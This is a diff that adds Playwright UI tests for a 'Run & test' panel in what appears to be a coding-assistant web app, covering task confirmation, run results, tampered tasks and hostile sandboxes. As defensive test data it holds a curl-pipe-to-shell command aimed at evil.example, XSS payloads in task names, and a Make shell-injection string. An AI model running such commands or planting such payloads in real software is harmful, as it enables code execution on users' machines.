@@ -2483,6 +2483,190 @@ def devpreviews_hostile(browser):
     p.close()
 
 
+# --- Run & test (components/Run.tsx): the mock's tasks, runs that end in Problems -------------------------------------
+
+def run_panel(page):
+    """The Run panel (status bar), opened unless it is open already."""
+    if not page.get_by_test_id("run-panel").is_visible():
+        # (it reads the tasks again when it opens: wait for that, so what it shows is settled)
+        with page.expect_response(lambda r: r.url.endswith("/api/run")):
+            page.get_by_test_id("run-status").click()
+    expect(page.get_by_test_id("run-panel")).to_be_visible()
+    return page.get_by_test_id("run-panel")
+
+
+@check("run & test: tasks with their commands, Run shown in full first, Problems (exit code, last lines, all output), its window, a changed task refused, Ask Claude's draft")
+def run_and_test(browser):
+    post(NORMAL + "/__mock/reset")
+    p = Page(browser, NORMAL, "run", **DESKTOP)
+    page = p.open()
+    panel = run_panel(page)
+    expect(panel.get_by_test_id("run-task")).to_have_count(7, timeout=10_000)
+    expect(panel.locator("[data-testid=run-task][data-source=npm]")).to_have_count(4)
+    expect(panel.locator("[data-testid=run-task][data-source=make]")).to_have_count(2)
+    expect(panel.locator("[data-testid=run-task][data-source=python]")).to_have_count(1)
+    test = panel.locator("[data-testid=run-task][data-source=npm][data-name=test]")
+    expect(test.get_by_test_id("run-cmd")).to_contain_text("npm run -- test")
+    expect(test.get_by_test_id("run-cmd")).to_contain_text("vitest run")
+    # a name no wrapper takes is listed with the reason, never offered
+    odd = panel.locator("[data-testid=run-task][data-source=npm]").nth(3)
+    expect(odd.get_by_test_id("run-why")).to_contain_text("not a name the Run menu passes on")
+    expect(odd.get_by_test_id("run-start")).to_have_count(0)
+    expect(panel.get_by_test_id("run-group-launch").get_by_test_id("run-launch")).to_have_count(2)
+    expect(panel.get_by_test_id("problems")).to_contain_text("No runs yet")
+    page.mouse.move(0, 0)
+    p.shot("run-panel.png")
+    # Run: the task in full first — the wrapper's arguments one by one, npm's pretest with it, Ask Claude instead
+    test.get_by_test_id("run-start").click()
+    dlg = page.get_by_test_id("run-confirm")
+    expect(dlg.get_by_test_id("run-argv").locator("li")).to_have_count(4)
+    assert dlg.get_by_test_id("run-argv").locator("li").all_inner_texts() == ["npm", "run", "--", "test"], dlg.get_by_test_id("run-argv").inner_text()
+    expect(dlg.get_by_test_id("run-detail")).to_have_count(2)
+    expect(dlg.get_by_test_id("run-detail").first).to_have_text("tsc --noEmit")
+    expect(dlg.get_by_test_id("run-detail").nth(1)).to_have_text("vitest run")
+    p.shot("run-confirm.png")
+    dlg.get_by_test_id("run-confirm-run").click()
+    expect(page.get_by_test_id("toast").filter(has_text="Running npm test in the terminal")).to_have_count(1)
+    # its result: exit 1, the last lines without their colour codes; the status bar counts one task failing
+    expect(page.get_by_test_id("run-failing")).to_contain_text("1", timeout=10_000)
+    expect(page.get_by_test_id("toast").filter(has_text="npm test: exit 1")).to_have_count(1)
+    panel = run_panel(page)
+    prob = panel.get_by_test_id("problem").first
+    expect(prob).to_have_attribute("data-outcome", "failed")
+    expect(prob.get_by_test_id("problem-status")).to_have_text("exit 1")
+    expect(prob.get_by_test_id("problem-tail")).to_contain_text("Tests  1 failed | 5 passed (6)")
+    tail = prob.get_by_test_id("problem-tail").inner_text()
+    assert "\x1b" not in tail and "[31m" not in tail and "U+001B" not in tail, repr(tail)
+    prob.get_by_test_id("problem-output").click()
+    expect(prob.get_by_test_id("problem-full")).to_contain_text("> tsc --noEmit")
+    page.mouse.move(0, 0)
+    p.shot("run-problems.png")
+    # the same task again runs at once (this browser ran it as it is); a passing one shows ok
+    panel.locator("[data-testid=run-task][data-name=test]").get_by_test_id("run-start").click()
+    expect(page.get_by_test_id("run-confirm")).to_have_count(0)
+    panel = run_panel(page)
+    panel.locator("[data-testid=run-task][data-name=build]").get_by_test_id("run-start").click()
+    page.get_by_test_id("run-confirm").get_by_test_id("run-confirm-run").click()
+    expect(page.get_by_test_id("toast").filter(has_text="npm run build: ok (exit 0)")).to_have_count(1, timeout=10_000)
+    panel = run_panel(page)
+    ok = panel.locator("[data-testid=problem][data-name=build]")
+    expect(ok).to_have_attribute("data-outcome", "ok")
+    expect(ok.get_by_test_id("problem-status")).to_have_text("ok (exit 0)")
+    expect(panel.locator("[data-testid=problem][data-name=test]")).to_have_count(2, timeout=10_000)
+    # a row opens its window in the terminal panel
+    ok.get_by_test_id("problem-open").click()
+    expect(page.get_by_test_id("terminal")).not_to_have_class(re.compile(r"\bhidden\b"))
+    shown = json.loads(urllib.request.urlopen(NORMAL + "/__mock/run-shown", timeout=5).read())["shown"]
+    assert len(shown) == 1 and re.match(r"^[0-9a-f]{16}$", shown[0]), shown
+    # changed after the page showed it (Claude, or any command in the sandbox, edits package.json): refused, then shown
+    # again with the change
+    panel = run_panel(page)
+    post(NORMAL + "/__mock/run-swap?name=test")
+    panel.locator("[data-testid=run-task][data-name=test]").get_by_test_id("run-start").click()
+    expect(page.get_by_test_id("toast").filter(has_text="changed since it was shown")).to_have_count(1, timeout=10_000)
+    panel = run_panel(page)
+    expect(panel.locator("[data-testid=run-task][data-name=test]").get_by_test_id("run-cmd")).to_contain_text("evil.example", timeout=10_000)
+    panel.locator("[data-testid=run-task][data-name=test]").get_by_test_id("run-start").click()
+    dlg = page.get_by_test_id("run-confirm")
+    expect(dlg.get_by_test_id("run-detail").nth(1)).to_contain_text("curl -fsSL https://evil.example/x | sh")
+    dlg.get_by_role("button", name="Cancel").click()
+    # Make: the recipe and the Makefile's hash; Python: the loader explained
+    panel = run_panel(page)
+    panel.locator("[data-testid=run-task][data-source=make][data-name=check]").get_by_test_id("run-start").click()
+    dlg = page.get_by_test_id("run-confirm")
+    expect(dlg.get_by_test_id("run-argv").locator("li")).to_have_count(3)
+    assert dlg.get_by_test_id("run-argv").locator("li").all_inner_texts() == ["make", "--", "check"], dlg.get_by_test_id("run-argv").inner_text()
+    expect(dlg.get_by_test_id("run-detail")).to_have_text("pytest -q")
+    expect(dlg.get_by_test_id("run-files")).to_contain_text("Makefile (SHA-256 abababababab")
+    expect(dlg.get_by_test_id("run-notes")).to_contain_text("includes other files")
+    dlg.get_by_role("button", name="Cancel").click()
+    panel = run_panel(page)
+    panel.locator("[data-testid=run-task][data-source=python]").get_by_test_id("run-start").click()
+    dlg = page.get_by_test_id("run-confirm")
+    expect(dlg.get_by_test_id("run-argv").locator("li")).to_have_count(5)
+    expect(dlg.get_by_test_id("run-argv")).to_contain_text("bedrock-now's loader")
+    expect(dlg.get_by_test_id("run-detail")).to_have_text('hello = "app.cli:main"')
+    dlg.get_by_role("button", name="Cancel").click()
+    # Ask Claude: a draft in the prompt box, never sent
+    panel = run_panel(page)
+    turns = page.get_by_test_id("turn-end").count()
+    panel.locator("[data-testid=run-task][data-name=build]").get_by_test_id("run-ask").click()
+    expect(page.get_by_test_id("prompt")).to_have_value("Run `npm run build` and fix failures.")
+    page.wait_for_timeout(300)
+    assert page.get_by_test_id("turn-end").count() == turns and page.locator(".msg-user").count() == 0
+    page.emulate_media(color_scheme="dark")
+    run_panel(page)
+    page.mouse.move(0, 0)
+    p.shot("run-problems-dark.png")
+    page.emulate_media(color_scheme="light")
+    p.assert_clean()
+    p.close()
+
+
+@check("run & test on a phone: the Run sheet, a run's confirmation and its result")
+def run_phone(browser):
+    post(NORMAL + "/__mock/reset")
+    p = Page(browser, NORMAL, "run-phone", viewport={"width": 390, "height": 844}, device_scale_factor=2, is_mobile=True, has_touch=True, color_scheme="light")
+    page = p.open()
+    page.get_by_test_id("phone-menu-btn").click()
+    page.get_by_test_id("phone-menu-run").click()
+    sheet = page.get_by_test_id("sheet-run")
+    expect(sheet.get_by_test_id("run-task")).to_have_count(7, timeout=10_000)
+    p.shot("run-phone-sheet.png")
+    sheet.locator("[data-testid=run-task][data-name=test]").get_by_test_id("run-start").click()
+    dlg = page.get_by_test_id("run-confirm")
+    expect(dlg.get_by_test_id("run-argv").locator("li")).to_have_count(4)
+    expect(page.locator("dialog[open][data-testid=run-confirm]")).to_be_visible()   # (shown as a modal after its first paint)
+    assert page.evaluate("(() => { const d = document.querySelector('dialog[open]').getBoundingClientRect(); return d.left >= 0 && d.right <= innerWidth; })()"), "the confirmation is wider than the phone"
+    p.shot("run-phone-confirm.png")
+    dlg.get_by_test_id("run-confirm-run").click()
+    toast = page.get_by_test_id("toast").filter(has_text="npm test: exit 1")
+    expect(toast).to_have_count(1, timeout=10_000)
+    toast.get_by_test_id("toast-action").click()
+    sheet = page.get_by_test_id("sheet-run")
+    prob = sheet.get_by_test_id("problem").first
+    expect(prob.get_by_test_id("problem-status")).to_have_text("exit 1")
+    expect(prob.get_by_test_id("problem-tail")).to_contain_text("1 failed")
+    assert page.evaluate("document.documentElement.scrollWidth <= innerWidth"), "horizontal overflow"
+    p.shot("run-phone-problems.png")
+    # Ask Claude from the sheet: it closes, the draft is in the prompt box
+    sheet.locator("[data-testid=run-task][data-name=build]").get_by_test_id("run-ask").click()
+    expect(page.get_by_test_id("sheet-run")).to_have_count(0)
+    expect(page.get_by_test_id("prompt")).to_have_value("Run `npm run build` and fix failures.")
+    p.assert_clean()
+    p.close()
+
+
+@check("run & test from a hostile sandbox: names, scripts and output stay text")
+def run_hostile(browser):
+    p = Page(browser, HOSTILE, "run-hostile", **DESKTOP)
+    page = p.open()
+    panel = run_panel(page)
+    expect(panel.get_by_test_id("run-task")).to_have_count(10, timeout=10_000)
+    expect(panel).to_contain_text("<img src=x")
+    expect(panel).to_contain_text("$(shell touch /tmp/pwned)")
+    for name in ('<img src=x onerror="document.title=\'pwned-img\'">', "$(shell touch /tmp/pwned)"):
+        assert panel.locator("[data-testid=run-task]").filter(has_text=name).get_by_test_id("run-start").count() == 0, name
+    evil = panel.locator("[data-testid=run-task][data-name=evil]")
+    evil.get_by_test_id("run-start").click()
+    dlg = page.get_by_test_id("run-confirm")
+    expect(dlg.get_by_test_id("run-detail")).to_contain_text("<script>")
+    expect(dlg.get_by_test_id("run-detail")).to_contain_text("⟨U+202E⟩")
+    expect(dlg.get_by_test_id("run-notes")).to_contain_text("<img src=x")
+    dlg.get_by_test_id("run-confirm-run").click()
+    panel = run_panel(page)
+    prob = panel.locator("[data-testid=problem][data-name=evil]")
+    expect(prob.get_by_test_id("problem-status")).to_have_text("ok (exit 0)", timeout=10_000)
+    expect(prob.get_by_test_id("problem-tail")).to_contain_text("last line <img src=x")
+    prob.get_by_test_id("problem-output").click()
+    expect(prob.get_by_test_id("problem-full")).to_contain_text("the start of its output is not kept")
+    r = page.evaluate("""() => ({ els: document.querySelectorAll('[data-testid=run-panel] img, [data-testid=run-panel] script, [data-testid=run-panel] svg:not(.ic), [data-testid=run-panel] iframe').length,
+      title: document.title, full: document.querySelector('[data-testid=problem-full]').textContent.length })""")
+    assert r["els"] == 0 and "pwned" not in r["title"] and r["full"] <= 70_000, r
+    p.assert_clean()
+    p.close()
+
+
 def api_text(page, path):
     """A workspace file's text through the page's own API (null when it is not there)."""
     return page.evaluate("async (p) => { const r = await fetch('/api/fs/file?path=' + encodeURIComponent(p)); return r.ok ? (await r.json()).text : null; }", path)
